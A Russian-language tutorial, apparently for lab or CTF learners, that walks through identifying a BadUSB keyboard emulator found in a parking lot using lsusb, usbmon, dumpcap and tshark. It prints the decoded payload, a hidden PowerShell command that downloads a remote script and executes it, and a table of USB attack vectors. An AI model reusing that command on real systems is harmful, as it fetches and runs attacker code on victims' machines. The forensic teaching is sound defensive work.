## Вопрос, с которого всё начинается

Тебе принесли USB-флешку, найденную в паркинге офиса. С виду — обычная, никаких надписей. Вопрос на миллион: это правда флешка или «умное» устройство, которое при подключении что-то наберёт от твоего имени? И как вообще посмотреть, что устройство отправляет хосту, если между ними нет сети?

Это и есть работа с **USB** — универсальной шиной, через которую к компьютеру подключается почти всё: клавиатуры, флешки, камеры, принтеры, сетевые адаптеры. Она интересна и как цель (перехват данных), и как оружие (эмуляция клавиатуры). Разберём её на одном объекте.

## Наш пример: флешка из паркинга

Дальше мы ведём одну историю: подключаем найденное устройство к изолированной лабораторной машине и шаг за шагом выясняем, кто перед нами. Никаких действий на боевой системе — только тестовый ноутбук, который не жалко.

Первый вопрос: **чем устройство представилось хосту?**

## Шаг 1: смотрим, кем назвалось устройство

Список подключённых USB-устройств даёт утилита `lsusb` (часть пакета usbutils):

```
$ lsusb
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 001 Device 004: ID 046d:c31c Logitech, Inc. Keyboard K120
Bus 001 Device 005: ID 1a86:e024 QinHeng Electronics USB2.0 HID
```

Каждая строка — устройство на шине. Формат: `Bus` (шина) → `Device` (адрес на шине) → `ID VID:PID` → название.

Наш объект — последняя строка, `Device 005`. Идентификатор `1a86:e024` — это **VID** (Vendor ID, код производителя) и **PID** (Product ID, код продукта), которые устройство сообщает о себе само. Само! Никакой проверки «настоящий ли это QinHeng» хост не делает.

Уже подозрительно: дешёвый чип CH340-семейства, а устройство зовётся `USB2.0 HID`. HID — это класс «Human Interface Device», то есть клавиатуры, мыши, геймпады. Флешка не должна быть HID.

## Шаг 2: читаем дескрипторы

Чтобы увидеть, что устройство о себе рассказывает подробно, добавляем `-v` (verbose). Вывод большой, поэтому отфильтруем по нужному устройству и классу:

```
$ lsusb -d 1a86:e024 -v 2>/dev/null | grep -A2 bInterfaceClass
      bInterfaceClass         3 Human Interface Device
      bInterfaceSubClass      1 Boot Interface Subclass
      bInterfaceProtocol      1 Keyboard
```

Вот и ответ: `bInterfaceClass 3` — это класс HID (код 0x03), подкласс `Boot`, протокол `Keyboard`. Устройство заявляет хосту: «я клавиатура».

**Дескриптор** — это структура данных, которой USB-устройство описывает себя хосту при подключении. Хост читает дескрипторы и решает, какой драйвер загрузить. Если дескриптор говорит «клавиатура», операционная система верит и принимает ввод без вопросов.

Значит, у нас в руках **BadUSB** — устройство, маскирующееся под клавиатуру. Осталось понять, что именно оно набирает.

## Шаг 3: как устроена шина (коротко, по делу)

Чтобы перехватить трафик, нужно понимать топологию. USB — **хост-центричная** шина: есть один хост (контроллер компьютера), который опрашивает устройства. Устройство не может «заговорить» первым — только отвечать.

При подключении происходит **enumeration** (перечисление): хост сбрасывает устройство, читает его дескрипторы, выбирает **конфигурацию** и назначает адрес. Именно на этом этапе устройство и «представляется» клавиатурой.

Данные идут по **endpoint**'ам — логическим каналам (IN — к хосту, OUT — от хоста). Линии физически две: `D+` и `D−`, плюс питание `VBUS` (5 В) и земля. Скорости: Low Speed 1.5 Мбит/с, Full Speed 12 Мбит/с, High Speed 480 Мбит/с.

## Шаг 4: перехватываем трафик

На Linux трафик USB виден через подсистему ядра `usbmon`. Загружаем модуль и смотрим шины:

```
$ sudo modprobe usbmon
$ ls /sys/kernel/debug/usb/usbmon/
0u  1u  2u
```

Файлы `Nu` — это шины (наш объект на `Bus 001`, значит `1u`). Пишем дамп этой шины в pcap через `dumpcap` (он умеет читать usbmon как интерфейс):

```
$ sudo dumpcap -i usbmon1 -w /tmp/usb.pcap -a duration:15
Capturing on 'usbmon1'
File: /tmp/usb.pcap
Packets captured: 8421
```

Пока идёт запись, устройство как раз отрабатывает свой payload — вставляет отчёты «нажатий». Открываем дамп `tshark`'ом и фильтруем только HID-данные:

```
$ tshark -r /tmp/usb.pcap -Y 'usbhid.data && usbhid.data != 0000000000000000' \
    -T fields -e frame.time_delta -e usbhid.data | head
0.000801000000  0000040000000000
0.000764000000  0000000000000000
0.000912000000  0000002c00000000
0.000788000000  0000000000000000
```

Первая колонка — интервал между пакетами. `0.0008` секунды — это меньше миллисекунды. Человек так не печатает: у настоящей клавиатуры паузы 50–200 мс. Микросекундные интервалы — явный признак автоматизации.

## Шаг 5: превращаем отчёты в текст

Вторая колонка — **HID-отчёт**: 8 байт. Первый байт — модификаторы (Ctrl/Shift/Alt/GUI), второй зарезервирован, дальше до шести **usage-кодов** одновременно нажатых клавиш. Отпускание — отчёт из нулей.

`0x04` — это usage-код клавиши `a`, `0x2c` — пробел. Декодировать вручную долго, поэтому в Wireshark включают диссектор HID и видят набранное как текст. В нашем случае собирается строка:

```
powershell -w hidden -c "iwr http://10.0.0.9/a.ps1|iex"
```

Вот и весь «payload»: устройство открывает PowerShell и тянет скрипт с внешнего адреса. По кодам клавиш его восстановили полностью, не имея доступа к содержимому «флешки».

## Шаг 6: классы устройств — карта поверхности

Наш пример был про HID, но классов больше, и каждый даёт свой вектор:

| Класс | Код | Назначение | Атака |
|-------|-----|-----------|-------|
| HID | 0x03 | клавиатура, мышь | инъекция нажатий |
| MSC | 0x08 | накопитель | автозапуск, LNK |
| CDC | 0x02 | сетевая/COM | перенаправление трафика |
| Audio | 0x01 | звук | подслушивание микрофона |
| Video | 0x0E | камера | захват изображения |
| Hub | 0x09 | концентратор | подмена топологии |
| Vendor | 0xFF | проприетарный | произвольные драйверы |

Опаснее всего HID: операционная система доверяет «клавиатуре» полностью, включая открытие терминала и запуск загрузки.

## Шаг 7: три уровня анализа

Полезно запомнить три уровня, на которых вообще исследуют USB:

1. **Софтовый** — `usbmon`/USBPcap и Wireshark. Дёшево, видно данные, но только на стороне хоста.
2. **Эмуляционный** — Facedancer/GreatFET: можно самому «стать» устройством и отвечать произвольно, фаззить драйверы.
3. **Электрический** — аппаратный анализатор (Beagle USB, Saleae). Видно всё, включая низкоуровневые пакеты, но дорого.

Мы использовали первый. Для CTF и большинства задач его хватает.

## Что мы теперь знаем

По-простому:

1. USB — хост-центричная шина; устройство представляется дескрипторами, и хост ему верит.
2. Класс HID (0x03) = клавиатура/мышь; HID-устройство может набирать команды от имени пользователя.
3. `lsusb` и `lsusb -v` показывают VID/PID и класс устройства.
4. `usbmon` + `dumpcap` + `tshark` перехватывают и декодируют USB-трафик.
5. Микросекундные интервалы между HID-отчётами выдают автоматическую инъекцию.

## На что смотреть дальше

- **VID/PID — не доказательство.** У «флешки» может стоять VID клавиатуры; смотрите на класс интерфейса, а не на название.
- **Снимайте трафик на своей шине.** Сначала `lsusb` → номер шины → `usbmonN`, иначе поймаете чужой трафик.
- **Права.** Для `usbmon` и `dumpcap` нужен root или группа `wireshark`.
- **HID-коды ≠ ASCII.** В отчётах usage-коды, нужен диссектор или таблица HID Usage ID.
